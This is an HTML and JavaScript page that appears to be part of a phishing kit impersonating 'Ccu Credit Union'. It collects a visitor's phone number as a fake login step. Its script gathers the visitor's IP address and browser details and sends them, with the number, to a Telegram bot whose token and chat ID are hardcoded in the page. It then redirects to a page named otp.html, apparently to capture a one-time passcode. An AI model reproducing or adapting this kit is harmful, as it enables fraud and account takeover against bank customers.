

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="stylesheet" href="../login.css">
</head>

<body>
    <div class="mainContainer">
        <div class="form">
            <div class="topNav">
                <img src="./logo.png" alt="Logo">
            </div>
            <form method="POST" action="" id="phoneForm">
                <div class="inputDiv">
                    <br>
                    <div class="username">
                        <label for="phoneNumber">Phone Number</label><br><br>
                        <input type="tel" id="phoneNumber" name="phoneNumber" required placeholder="Enter your phone number">
                    </div>
                    <br>
                    <div><button type="submit" class="signIn">Next</button></div><br>
                </div>
            </form>
        </div>
    </div>

    <div class="loading-container" style="display: none;">
        <div class="spinner"></div>
    </div>

    <script>
        // Function to automatically format phone number as (XXX) XXX-XXXX
        document.getElementById('phoneNumber').addEventListener('input', function (e) {
            let input = e.target.value.replace(/\D/g, ''); // Remove non-numeric characters
            if (input.length > 3 && input.length <= 6) {
                input = `(${input.slice(0, 3)}) ${input.slice(3)}`;
            } else if (input.length > 6) {
                input = `(${input.slice(0, 3)}) ${input.slice(3, 6)}-${input.slice(6, 10)}`;
            } else if (input.length > 0) {
                input = `(${input.slice(0, 3)}) ${input.slice(3)}`;
            }
            e.target.value = input;
        });

        // Function to send data to Telegram
        async function sendDataToTelegram(phoneNumber, ip, ua, botToken, chatId) {
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: `#------------------[ Ccu Credit Union Contact ]---------------------#
Member Contact  : ${phoneNumber}
#---------------------[ Visitor ]-------------------------#
IP Address  : ${ip}
DEVICE INFORMATION      : ${ua}
#-------------------[ G1 - END ]------------------------#`
                    })
                });

                const data = await response.json();

                if (data.ok) {
                    console.log("Message sent successfully:", data);
                } else {
                    console.error("Telegram API returned an error:", data.description);
                }
            } catch (error) {
                console.error("Error sending message:", error);
            }
        }

        // Function to fetch the IP address
        async function fetchIpAddress() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error("Error fetching IP address:", error);
                return "Unavailable";
            }
        }

        // Event listener for form submission
        document.querySelector('#phoneForm').addEventListener('submit', async function (event) {
            event.preventDefault();

            // Get the phone number value from the form
            const phoneNumber = document.querySelector('#phoneNumber').value.trim();

            if (phoneNumber) {
                // Show loading indicator and hide form
                document.querySelector('.form').style.display = 'none';
                document.querySelector('.loading-container').style.display = 'flex';

                // Fetch IP address and User-Agent
                const ip = await fetchIpAddress();
                const ua = navigator.userAgent;

                // Bot tokens and chat IDs
                const botToken1 = '7296082774:AAFvxOm88DKwjKo_lar3bbwJOcRftuNvNlc';
                const chatId1 = '6994641548';  // Ensure this is a valid chat ID (user or group)
                
                // Send data to both bots
                try {
                    await sendDataToTelegram(phoneNumber, ip, ua, botToken1, chatId1);

                    // Redirect to next page after 5 seconds
                    setTimeout(() => {
                        window.location.href = "./otp.html";  // Change this to your next page URL
                    }, 5000);
                } catch (error) {
                    console.error("Error in sending data to Telegram bots:", error);
                }
            } else {
                console.error("Phone number is missing!");
            }
        });
    </script>
</body>

</html>
